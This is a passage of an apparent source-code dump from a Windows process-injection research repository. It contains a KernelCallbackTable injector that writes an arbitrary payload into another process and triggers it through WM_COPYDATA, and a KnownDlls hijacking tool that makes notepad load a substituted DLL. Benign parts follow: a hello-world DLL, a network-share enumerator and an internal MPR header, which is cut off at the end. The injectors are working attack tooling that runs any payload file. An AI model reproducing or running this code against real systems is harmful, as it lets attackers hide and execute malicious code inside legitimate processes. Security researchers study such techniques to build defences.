        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Write the new table to remote process
    ds = VirtualAllocEx(hp, NULL, sizeof(kct),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    kct.__fnCOPYDATA = (ULONG_PTR)cs;
    WriteProcessMemory(hp, ds, &kct, sizeof(kct), &wr);
    
    // 5. Update the PEB
    WriteProcessMemory(hp, 
      (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
      &ds, sizeof(ULONG_PTR), &wr);
    
    // 6. Trigger execution of payload
    cds.dwData = 1;
    cds.cbData = lstrlen(msg) * 2;
    cds.lpData = msg;
    
    SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);
    
    // 7. Restore original KernelCallbackTable
    WriteProcessMemory(hp,
      (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
      &peb.KernelCallbackTable, sizeof(ULONG_PTR), &wr);
      
    // 8. Release memory for code and data, close process
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    CloseHandle(hp);
}
  
DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}
  
int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: kct <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    kernelcallbacktable(pic, len);
    return 0;
}

```

`knowndlls/hello.c`:

```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#pragma comment(lib, "user32.lib")

__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      MessageBox(NULL, "Hello world!", "Hello World!", 0);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}

```

`knowndlls/knowndll.cpp`:

```cpp
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

HRESULT GetDesktopShellView(REFIID riid, void **ppv) {
    HWND           hwnd;
    IDispatch      *pdisp;
    IShellWindows  *psw;
    VARIANT        vEmpty = {};
    IShellBrowser  *psb;
    IShellView     *psv;
    HRESULT        hr;
    
    *ppv = NULL;
        
    hr = CoCreateInstance(CLSID_ShellWindows, 
      NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&psw));
      
    if(hr == S_OK) {
      hr = psw->FindWindowSW(
        &vEmpty, &vEmpty, 
        SWC_DESKTOP, (long*)&hwnd, 
        SWFO_NEEDDISPATCH, &pdisp);
        
      if(hr == S_OK) {
        hr = IUnknown_QueryService(
          pdisp, SID_STopLevelBrowser, IID_PPV_ARGS(&psb));
        if(hr == S_OK) {
          hr = psb->QueryActiveShellView(&psv);
          if(hr == S_OK) {
            hr = psv->QueryInterface(riid, ppv);
            psv->Release();
          }
          psb->Release();
        }
        pdisp->Release();
      }
      psw->Release();
    }
    return hr;
}

HRESULT GetShellDispatch(
  IShellView *psv, REFIID riid, void **ppv) 
{
    IShellFolderViewDual *psfvd;
    IDispatch            *pdispBackground, *pdisp;;
    HRESULT              hr;
    
    *ppv = NULL;
    hr = psv->GetItemObject(
      SVGIO_BACKGROUND, IID_PPV_ARGS(&pdispBackground));
    
    if(hr == S_OK) {
      hr = pdispBackground->QueryInterface(IID_PPV_ARGS(&psfvd));
      if(hr == S_OK) {
        hr = psfvd->get_Application(&pdisp);
        if(hr == S_OK) {
          hr = pdisp->QueryInterface(riid, ppv);
          pdisp->Release();
        }
        psfvd->Release();
      }
      pdispBackground->Release();
    }
    return hr;
}

HRESULT ShellExecInExplorer(PCWSTR pszFile) {
    IShellView      *psv;
    IShellDispatch2 *psd;
    HRESULT         hr;
    BSTR            bstrFile;
    VARIANT         vtHide, vtEmpty = {};
    
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    
    bstrFile = SysAllocString(pszFile);
    if(bstrFile == NULL) return E_OUTOFMEMORY;
    
    hr = GetDesktopShellView(IID_PPV_ARGS(&psv));
    if(hr == S_OK) {
      hr = GetShellDispatch(psv, IID_PPV_ARGS(&psd));
      if(hr == S_OK) {
        V_VT(&vtHide)  = VT_INT;
        V_INT(&vtHide) = SW_HIDE;
        hr = psd->ShellExecuteW(
          bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty);
        psd->Release();
      }
      psv->Release();
    }
    SysFreeString(bstrFile);
    return hr;
}

HANDLE GetKnownDllHandle2(DWORD pid, HANDLE hp) {
    ULONG                      len;
    NTSTATUS                   nts;
    LPVOID                     list=NULL;    
    DWORD                      i;
    HANDLE                     obj, h = NULL;
    PSYSTEM_HANDLE_INFORMATION hl;
    BYTE                       buf[1024];
    POBJECT_NAME_INFORMATION   name = (POBJECT_NAME_INFORMATION)buf;
    
    // read the full list of system handles
    for(len = 8192; ;len += 8192) {
      list = malloc(len);
      
      nts = NtQuerySystemInformation(
          SystemHandleInformation, list, len, NULL);
      
      // break from loop if ok    
      if(NT_SUCCESS(nts)) break;
      
      // free list and continue
      free(list);
    }
    
    hl = (PSYSTEM_HANDLE_INFORMATION)list;

    // for each handle
    for(i=0; i<hl->NumberOfHandles && h == NULL; i++) {
      // skip these to avoid hanging process
      if((hl->Handles[i].GrantedAccess == 0x0012019f) || 
         (hl->Handles[i].GrantedAccess == 0x001a019f) || 
         (hl->Handles[i].GrantedAccess == 0x00120189) || 
         (hl->Handles[i].GrantedAccess == 0x00100000)) {
        continue;
      }

      // skip if this handle not in our target process
      if(hl->Handles[i].UniqueProcessId != pid) {
        continue;
      }
      
      // duplicate the handle object
      nts = NtDuplicateObject(
            hp, (HANDLE)hl->Handles[i].HandleValue, 
            GetCurrentProcess(), &obj, 0, FALSE, 
            DUPLICATE_SAME_ACCESS);
        
      if(NT_SUCCESS(nts)) {
        // query the name
        NtQueryObject(
          obj, ObjectNameInformation, 
          name, MAX_PATH, NULL);
          
        // if name returned.. 
        if(name->Name.Length != 0) {
          // is it knowndlls directory?
          if(!lstrcmp(name->Name.Buffer, L"\\KnownDlls")) {
            h = (HANDLE)hl->Handles[i].HandleValue;
          }
        }
        NtClose(obj);
      }
    }
    free(list);
    return h;
}

LPVOID GetKnownDllHandle(DWORD pid) {
    LPVOID                   m, va = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, cnt;
    PULONG_PTR               ds;
    BYTE                     buf[1024];
    POBJECT_NAME_INFORMATION n = (POBJECT_NAME_INFORMATION)buf;

    // get base of NTDLL and pointer to section header
    m   = GetModuleHandle(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    // for each pointer
    for(i=0; i<cnt; i++) {
      if((LPVOID)ds[i] == NULL) continue;
      // query the object name
      NtQueryObject((LPVOID)ds[i], 
        ObjectNameInformation, n, MAX_PATH, NULL);
            
      // string returned?
      if(n->Name.Length != 0) {
        // does it match ours?
        if(!lstrcmp(n->Name.Buffer, L"\\KnownDlls")) {
          // return virtual address
          va = &ds[i];
          break;
        }
      }
    }
    return va;
}

VOID knowndll_inject(DWORD pid, PWCHAR fake_dll, PWCHAR target_dll) {
    NTSTATUS          nts;
    DWORD             i;
    HANDLE            hp, hs, hf, dir, target_handle;
    OBJECT_ATTRIBUTES fa, da, sa;
    UNICODE_STRING    fn, dn, sn, ntpath;
    IO_STATUS_BLOCK   iosb;

    // open process for duplicating handle, suspending/resuming process
    hp = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, FALSE, pid);
    
    // 1. Get the KnownDlls directory object handle from remote process
    target_handle = GetKnownDllHandle2(pid, hp);

    // 2. Create empty object directory, insert named section of DLL to hijack
    //    using file handle of DLL to inject    
    InitializeObjectAttributes(&da, NULL, 0, NULL, NULL);
    nts = NtCreateDirectoryObject(&dir, DIRECTORY_ALL_ACCESS, &da);
    
    // 2.1 open the fake DLL
    RtlDosPathNameToNtPathName_U(fake_dll, &fn, NULL, NULL);
    InitializeObjectAttributes(&fa, &fn, OBJ_CASE_INSENSITIVE, NULL, NULL);
      
    nts = NtOpenFile(
      &hf, FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE,
      &fa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
    
    // 2.2 create named section of target DLL using fake DLL image
    RtlInitUnicodeString(&sn, target_dll);
    InitializeObjectAttributes(&sa, &sn, OBJ_CASE_INSENSITIVE, dir, NULL);
        
    nts = NtCreateSection(
      &hs, SECTION_ALL_ACCESS, &sa, 
      NULL, PAGE_EXECUTE, SEC_IMAGE, hf);
            
    // 3. Close the known DLLs handle in remote process
    NtSuspendProcess(hp);
    
    DuplicateHandle(hp, target_handle, 
      GetCurrentProcess(), NULL, 0, TRUE, DUPLICATE_CLOSE_SOURCE);
                    
    // 4. Duplicate object directory for remote process
    DuplicateHandle(
        GetCurrentProcess(), dir, hp, 
        NULL, 0, TRUE, DUPLICATE_SAME_ACCESS);
        
    NtResumeProcess(hp);
    CloseHandle(hp);
    
    printf("Select File->Open to load \"%ws\" into notepad.\n", fake_dll);
    printf("Press any key to continue...\n");
    getchar();
}

// list KnownDLLs
VOID knowndll_list(VOID) {
    HKEY  hk;
    DWORD err, namelen, sublen, idx;
    WCHAR name[MAX_PATH], subkey[MAX_PATH];
    
    err = RegOpenKeyEx(
      HKEY_LOCAL_MACHINE, 
      L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs", 
      0, KEY_READ | KEY_QUERY_VALUE, &hk);
      
    if(err == ERROR_SUCCESS) {
      for(idx=0; ;idx++) {
        sublen  = MAX_PATH;
        namelen = MAX_PATH;
        
        err = RegEnumValue(
          hk, idx, subkey, &sublen, 
          NULL, NULL, (PBYTE)name, &namelen);
          
        if(err != ERROR_SUCCESS) break;
        printf("%ws\n", name);
      }
      RegCloseKey(hk);
    }
}

int main(void) {
    int                 argc;
    WCHAR               **argv;
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    WCHAR               cmd[] = L"notepad";
    WCHAR               path[MAX_PATH];
    UNICODE_STRING      ntpath;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc != 2) {
      printf("usage: knowndll_inject <dll_to_inject>\n");
      return 0;
    }
    
    // create notepad
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.wShowWindow = SW_SHOWDEFAULT;
    
    printf("Running notepad.\n");
    if(!CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
      printf("Unable to create host process.\n");
      return 0;
    }
    
    printf("Created notepad.exe with pid : %i\n", pi.dwProcessId);
    
    GetFullPathName(argv[1], MAX_PATH, path, NULL);
    knowndll_inject(pi.dwProcessId, path, L"ole32.dll");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    TerminateProcess(pi.hProcess, 0);
    
    return 0;
}

```

`mpr/enum.c`:

```c
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "mpr.lib")

#include <windows.h>
#include <stdio.h>
#include <winnetwk.h>

BOOL WINAPI EnumerateFunc(LPNETRESOURCE lpnr);
void DisplayStruct(int i, LPNETRESOURCE lpnrLocal);

int main()
{

    LPNETRESOURCE lpnr = NULL;

    if (EnumerateFunc(lpnr) == FALSE) {
        printf("Call to EnumerateFunc failed\n");
        return 1;
    } else
        return 0;
    getchar();
}

BOOL WINAPI EnumerateFunc(LPNETRESOURCE lpnr)
{
    DWORD dwResult, dwResultEnum;
    HANDLE hEnum;
    DWORD cbBuffer = 16384;     // 16K is a good size
    DWORD cEntries = -1;        // enumerate all possible entries
    LPNETRESOURCE lpnrLocal;    // pointer to enumerated structures
    DWORD i;
    //
    // Call the WNetOpenEnum function to begin the enumeration.
    //
    dwResult = WNetOpenEnum(RESOURCE_GLOBALNET, // all network resources
                            RESOURCETYPE_ANY,   // all resources
                            0,  // enumerate all resources
                            lpnr,       // NULL first time the function is called
                            &hEnum);    // handle to the resource

    if (dwResult != NO_ERROR) {
        printf("WnetOpenEnum failed with error %d\n", dwResult);
        return FALSE;
    }
    //
    // Call the GlobalAlloc function to allocate resources.
    //
    lpnrLocal = (LPNETRESOURCE) GlobalAlloc(GPTR, cbBuffer);
    if (lpnrLocal == NULL) {
        printf("WnetOpenEnum failed with error %d\n", dwResult);
//      NetErrorHandler(hwnd, dwResult, (LPSTR)"WNetOpenEnum");
        return FALSE;
    }

    do {
        //
        // Initialize the buffer.
        //
        ZeroMemory(lpnrLocal, cbBuffer);
        //
        // Call the WNetEnumResource function to continue
        //  the enumeration.
        //
        dwResultEnum = WNetEnumResource(hEnum,  // resource handle
                                        &cEntries,      // defined locally as -1
                                        lpnrLocal,      // LPNETRESOURCE
                                        &cbBuffer);     // buffer size
        //
        // If the call succeeds, loop through the structures.
        //
        if (dwResultEnum == NO_ERROR) {
            for (i = 0; i < cEntries; i++) {
                // Call an application-defined function to
                //  display the contents of the NETRESOURCE structures.
                //
                DisplayStruct(i, &lpnrLocal[i]);

                // If the NETRESOURCE structure represents a container resource, 
                //  call the EnumerateFunc function recursively.

                if (RESOURCEUSAGE_CONTAINER == (lpnrLocal[i].dwUsage
                                                & RESOURCEUSAGE_CONTAINER))
//          if(!EnumerateFunc(hwnd, hdc, &lpnrLocal[i]))
                    if (!EnumerateFunc(&lpnrLocal[i]))
                        printf("EnumerateFunc returned FALSE\n");
//            TextOut(hdc, 10, 10, "EnumerateFunc returned FALSE.", 29);
            }
        }
        // Process errors.
        //
        else if (dwResultEnum != ERROR_NO_MORE_ITEMS) {
            printf("WNetEnumResource failed with error %d\n", dwResultEnum);

//      NetErrorHandler(hwnd, dwResultEnum, (LPSTR)"WNetEnumResource");
            break;
        }
    }
    //
    // End do.
    //
    while (dwResultEnum != ERROR_NO_MORE_ITEMS);
    //
    // Call the GlobalFree function to free the memory.
    //
    GlobalFree((HGLOBAL) lpnrLocal);
    //
    // Call WNetCloseEnum to end the enumeration.
    //
    dwResult = WNetCloseEnum(hEnum);

    if (dwResult != NO_ERROR) {
        //
        // Process errors.
        //
        printf("WNetCloseEnum failed with error %d\n", dwResult);
//    NetErrorHandler(hwnd, dwResult, (LPSTR)"WNetCloseEnum");
        return FALSE;
    }

    return TRUE;
}

void DisplayStruct(int i, LPNETRESOURCE lpnrLocal)
{
    printf("NETRESOURCE[%d] Scope: ", i);
    switch (lpnrLocal->dwScope) {
    case (RESOURCE_CONNECTED):
        printf("connected\n");
        break;
    case (RESOURCE_GLOBALNET):
        printf("all resources\n");
        break;
    case (RESOURCE_REMEMBERED):
        printf("remembered\n");
        break;
    default:
        printf("unknown scope %d\n", lpnrLocal->dwScope);
        break;
    }

    printf("NETRESOURCE[%d] Type: ", i);
    switch (lpnrLocal->dwType) {
    case (RESOURCETYPE_ANY):
        printf("any\n");
        break;
    case (RESOURCETYPE_DISK):
        printf("disk\n");
        break;
    case (RESOURCETYPE_PRINT):
        printf("print\n");
        break;
    default:
        printf("unknown type %d\n", lpnrLocal->dwType);
        break;
    }

    printf("NETRESOURCE[%d] DisplayType: ", i);
    switch (lpnrLocal->dwDisplayType) {
    case (RESOURCEDISPLAYTYPE_GENERIC):
        printf("generic\n");
        break;
    case (RESOURCEDISPLAYTYPE_DOMAIN):
        printf("domain\n");
        break;
    case (RESOURCEDISPLAYTYPE_SERVER):
        printf("server\n");
        break;
    case (RESOURCEDISPLAYTYPE_SHARE):
        printf("share\n");
        break;
    case (RESOURCEDISPLAYTYPE_FILE):
        printf("file\n");
        break;
    case (RESOURCEDISPLAYTYPE_GROUP):
        printf("group\n");
        break;
    case (RESOURCEDISPLAYTYPE_NETWORK):
        printf("network\n");
        break;
    default:
        printf("unknown display type %d\n", lpnrLocal->dwDisplayType);
        break;
    }

    printf("NETRESOURCE[%d] Usage: 0x%x = ", i, lpnrLocal->dwUsage);
    if (lpnrLocal->dwUsage & RESOURCEUSAGE_CONNECTABLE)
        printf("connectable ");
    if (lpnrLocal->dwUsage & RESOURCEUSAGE_CONTAINER)
        printf("container ");
    printf("\n");

    printf("NETRESOURCE[%d] Localname: %S\n", i, lpnrLocal->lpLocalName);
    printf("NETRESOURCE[%d] Remotename: %S\n", i, lpnrLocal->lpRemoteName);
    printf("NETRESOURCE[%d] Comment: %S\n", i, lpnrLocal->lpComment);
    printf("NETRESOURCE[%d] Provider: %S\n", i, lpnrLocal->lpProvider);
    printf("\n");
}
```

`mpr/mprdata.h`:

```h
/*++

Copyright (c) 1991  Microsoft Corporation

Module Name:

    mprdata.h

Abstract:

    Contains data structures and function prototypes that are internal to
    MPR.

Author:

    Dan Lafferty (danl)     07-Sept-1991

Environment:

    User Mode -Win32

Revision History:

    01-Mar-1994     Danl
        Created a separate location for the Credential Managers GetCaps()
        function.  This way if a provider has both a credential manager
        dll and a network dll, we will be able to direct calls to the
        correct GetCaps() function.
    07-Jan-1993     Danl
        Add NPLogonNotify and NPPasswordChangeNotify and AuthentDllName
        to PROVIDER structure.  Also added CREDENTIAL_TYPE InitClass.

    04-Aug-1992     chuckc
        added MprEnterLoadLibCritSect, MprLeaveLoadLibCritSect.

    07-Sept-1991    danl
        created

--*/

//
// Includes
//


//=======================
// Data Structures
//=======================
typedef struct _PROVIDER {
    NETRESOURCE                   Resource;
    DWORD                         Type;           // WNNC_NET_MSNet, WNNC_NET_LanMan, WNNC_NET_NetWare
    HMODULE                       Handle;         // Handle to the provider DLL.
    LPTSTR                        DllName;        // set to NULL after loaded.
    HMODULE                       AuthentHandle;  // Handle to authenticator DLL.
    LPTSTR                        AuthentDllName; // Authenticator Dll.
    DWORD                         InitClass;      // Network or Authentication provider.
    DWORD                         ConnectCaps;    // Cached result of GetCaps(WNNC_CONNECTION)
    PF_NPAddConnection            AddConnection;
    PF_NPAddConnection3           AddConnection3;
    PF_NPGetReconnectFlags        GetReconnectFlags;
    PF_NPCancelConnection         CancelConnection;
    PF_NPGetConnection            GetConnection;
    PF_NPGetConnection3           GetConnection3;
    PF_NPGetUser                  GetUser;
    PF_NPOpenEnum                 OpenEnum;
    PF_NPEnumResource             EnumResource;
    PF_NPCloseEnum                CloseEnum;
    PF_NPGetCaps                  GetCaps;
    PF_NPGetDirectoryType         GetDirectoryType;
    PF_NPDirectoryNotify          DirectoryNotify;
    PF_NPPropertyDialog           PropertyDialog;
    PF_NPGetPropertyText          GetPropertyText;
    PF_NPSearchDialog             SearchDialog;
    PF_NPFormatNetworkName        FormatNetworkName;
    PF_NPLogonNotify              LogonNotify;
    PF_NPPasswordChangeNotify     PasswordChangeNotify;
    PF_NPGetCaps                  GetAuthentCaps;
    PF_NPFMXGetPermCaps           FMXGetPermCaps;
    PF_NPFMXEditPerm              FMXEditPerm;
    PF_NPFMXGetPermHelp           FMXGetPermHelp;
    PF_NPGetUniversalName         GetUniversalName;
    PF_NPGetResourceParent        GetResourceParent;
    PF_NPGetResourceInformation   GetResourceInformation;
    PF_NPGetConnectionPerformance GetConnectionPerformance;
}PROVIDER, *LPPROVIDER;


typedef struct _ERROR_RECORD {
    struct  _ERROR_RECORD   *Prev;
    struct  _ERROR_RECORD   *Next;
    DWORD                   ThreadId;
    DWORD                   ErrorCode;
    LPTSTR                  ErrorText;      // This is an allocated buffer
    LPTSTR                  ProviderName;   // This is an allocated buffer
} ERROR_RECORD, *LPERROR_RECORD;

//=======================
// MACROS
//=======================

#define IS_EMPTY_STRING(pch) ( !pch || !*(pch) )

#define LENGTH(array)   (sizeof(array)/sizeof((array)[0]))

#define FIND_END_OF_LIST(record)    while(record->Next != NULL) {   \
                                        record=record->Next;        \
                                    }

#define REMOVE_FROM_LIST(record)    record->Prev->Next = record->Next;      \
                                    if (record->Next != NULL) {             \
                                        record->Next->Prev = record->Prev;  \
                                    }

#define ADD_TO_LIST(record, newRec) FIND_END_OF_LIST(record)    \
                                    record->Next = newRec;      \
                                    newRec->Prev = record;      \
                                    newRec->Next = NULL;

#define INIT_IF_NECESSARY(level,status) if(!(GlobalInitLevel & level)) {    \
                                            status = MprLevel2Init(level);  \
                                            if (status != WN_SUCCESS) {     \
                                                SetLastError(status);       \
                                                return(status);             \
                                            }                               \
                                        }

//=======================
// INLINE FUNCTIONS
//=======================

inline void
PROBE_FOR_WRITE(
    LPDWORD pdw
    )
// WARNING: This function can throw an exception.  It must be called from
// within a try-except block.
{
    *(volatile DWORD *)pdw = *(volatile DWORD *)pdw;
}

inline BOOL
IS_BAD_BYTE_BUFFER(
    LPVOID  lpBuffer,
    LPDWORD lpBufferSize    // in bytes
    )
// WARNING: This function can throw an exception.  It must be called from
// within a try-except block.
{
    PROBE_FOR_WRITE(lpBufferSize);
    return IsBadWritePtr(lpBuffer, *lpBufferSize);
}

inline BOOL
IS_BAD_WCHAR_BUFFER(
    LPVOID  lpBuffer,
    LPDWORD lpBufferSize    // in Unicode characters
    )
// WARNING: This function can throw an exception.  It must be called from
// within a try-except block.
{
    PROBE_FOR_WRITE(lpBufferSize);
    return IsBadWritePtr(lpBuffer, *lpBufferSize * sizeof(WCHAR));
}

//=======================
// CONSTANTS
//=======================
#define DEFAULT_MAX_PROVIDERS   25

// Bit masks for remembering error codes
#define BAD_NAME        0x00000001
#define NO_NET          0x00000002
#define NOT_CONNECTED   0x00000004
#define NOT_CONTAINER   0x00000008
#define NO_DEVICES      0x00000010
#define OTHER_ERRS      0xFFFFFFFF

#define REDIR_DEVICE    0x00000001
#define REMOTE_NAME     0x00000002
#define LOCAL_NAME      REDIR_DEVICE

#define DA_READ         0x00000001
#define DA_WRITE        0x00000002
#define DA_DELETE       0x00000004

//
// Timeout values for restoring connections and notifying
// Credential Managers.
//
#define DEFAULT_WAIT_TIME       60000   // Default timeout if providers don't
                                        // specify.

#define MAX_ALLOWED_WAIT_TIME   300000  // Max timeout a provider can specify

#define RECONNECT_SLEEP_INCREMENT 3000  // number of seconds to sleep

#define PROVIDER_WILL_NOT_START 0x00000000 // The provider will not be starting
#define NO_TIME_ESTIMATE        0xffffffff // The provider cannot predict the
                                           // amount of time it will take to
                                           // start.

#define NET_PROVIDER_KEY         TEXT("system\\CurrentControlSet\\Control\\NetworkProvider")
#define RESTORE_WAIT_VALUE       TEXT("RestoreTimeout")
#define RESTORE_CONNECTION_VALUE TEXT("RestoreConnection")
#define DEFER_CONNECTION_VALUE   TEXT("DeferConnection")


//
// GlobalInitLevels & InitClasses
//
// NOTE:  The WN_???_CLASS values are bit masks.
//
//  GlobalInitLevel
#define FIRST_LEVEL             0x00000001
#define NETWORK_LEVEL           0x00000002
#define CREDENTIAL_LEVEL        0x00000004
#define NOTIFIEE_LEVEL          0x00000008
//
//
//  InitClasses
#define NETWORK_TYPE        WN_NETWORK_CLASS
#define CREDENTIAL_TYPE     (WN_CREDENTIAL_CLASS | WN_PRIMARY_AUTHENT_CLASS)


// The path in the registry for user's persistent connections is found in
// the following key:
//
//      "\HKEY_CURRENT_USER\Network"
//
//  Subkeys of the network section listed by local drive names.  These
//  keys contain the following values:
//      RemotePath, Type, ProviderName, UserName
//
//              d:  RemotePath = \\cyclops\scratch
//                  Type = RESOURCE_TYPE_DISK
//                  ProviderName = LanMan
//                  UserName = Ernie

#define CONNECTION_KEY_NAME           TEXT("Network")

#define REMOTE_PATH_NAME              TEXT("RemotePath")
#define USER_NAME                     TEXT("UserName")
#define PROVIDER_NAME                 TEXT("ProviderName")
#define PROVIDER_TYPE                 TEXT("ProviderType")
#define PROVIDER_FLAGS                TEXT("ProviderFlags")
#define DEFER_FLAGS                   TEXT("DeferFlags")
#define CONNECTION_TYPE               TEXT("ConnectionType")

#define PRINT_CONNECTION_KEY_NAME     TEXT("Printers\\RestoredConnections")

//=======================
// Global data
//=======================
extern LPPROVIDER       GlobalProviderInfo;   // pArray of PROVIDER Structures
extern DWORD            GlobalNumProviders;
extern ERROR_RECORD     MprErrorRecList;
extern DWORD            MprDebugLevel;
extern HANDLE           MprLoadLibSemaphore;  // used to protect DLL handles
extern volatile DWORD   GlobalInitLevel;
extern CRITICAL_SECTION MprErrorRecCritSec;

//==========================
// Functions from support.c
//==========================


VOID
MprDeleteIndexArray(
    VOID
    );

DWORD
MprFindCallOrder(
    IN  LPTSTR      NameInfo,
    OUT LPDWORD     *IndexArrayPtr,
    OUT LPDWORD     IndexArrayCount,
    IN  DWORD       InitClass
    );

DWORD
MprDeviceType(
    IN  LPCTSTR DeviceName
    );

BOOL
MprGetProviderIndex(
    IN  LPCTSTR ProviderName,
    OUT LPDWORD IndexPtr
    );

LPPROVIDER
MprFindProviderByName(
    IN  LPCWSTR ProviderName
    );

LPPROVIDER
MprFindProviderByType(
    IN  DWORD   ProviderType
    );

DWORD
MprFindProviderForPath(
    IN  LPWSTR  lpPathName,
    OUT LPDWORD lpProviderIndex
    );

VOID
MprInitIndexArray(
    LPDWORD     IndexArray,
    DWORD       NumEntries
    );

VOID
MprEndCallOrder(
    VOID
    );

LPERROR_RECORD
MprAllocErrorRecord(
    VOID);

VOID
MprFreeErrorRecord(
    VOID);

LPERROR_RECORD
MprFindErrorRecord(
    DWORD   CurrentThreadId
    );

BOOL
MprNetIsAvailable(
    VOID) ;

//=========================
// Functions from mprreg.c
//=========================

BOOL
MprOpenKey(
    HKEY        hKey,
    LPTSTR      lpSubKey,
    PHKEY       phKeyHandle,
    DWORD       desiredAccess
    );

BOOL
MprGetKeyValue(
    HKEY    KeyHandle,
    LPTSTR  ValueName,
    LPTSTR  *ValueString
    );

BOOL
MprGetKeyDwordValue(
    IN  HKEY    KeyHandle,
    IN  LPCWSTR ValueName,
    OUT DWORD * Value
    );

LONG
MprGetKeyNumberValue(
    IN  HKEY    KeyHandle,
    IN  LPCWSTR ValueName,
    IN  LONG    Default
    );

DWORD
MprEnumKey(
    IN  HKEY    KeyHandle,
    IN  DWORD   SubKeyIndex,
    OUT LPTSTR  *SubKeyName,
    IN  DWORD   MaxSubKeyNameLen
    );

BOOL
MprGetKeyInfo(
    IN  HKEY    KeyHandle,
    OUT LPDWORD TitleIndex OPTIONAL,
    OUT LPDWORD NumSubKeys,
    OUT LPDWORD MaxSubKeyLen,
    OUT LPDWORD NumValues OPTIONAL,
    OUT LPDWORD MaxValueLen
    );

DWORD MprGetPrintKeyInfo(HKEY    KeyHandle,
                         LPDWORD NumValueNames,
                         LPDWORD MaxValueNameLength,
                         LPDWORD MaxValueLen) ;

BOOL
MprFindDriveInRegistry (
    IN  LPCTSTR DriveName,
    OUT LPTSTR  *RemoteName
    );

DWORD
MprRememberConnection (
    IN LPPROVIDER       Provider,
    IN LPCTSTR          UserName,
    IN LPNETRESOURCEW   NetResource,
    IN BYTE             ProviderFlags,
    IN DWORD            DeferFlags
    );

DWORD
MprSetRegValue(
    IN  HKEY    KeyHandle,
    IN  LPTSTR  ValueName,
    IN  LPCTSTR ValueString,
    IN  DWORD   LongValue
    );

DWORD
MprCreateRegKey(
    IN  HKEY    BaseKeyHandle,
    IN  LPTSTR  KeyName,
    OUT PHKEY   KeyHandlePtr
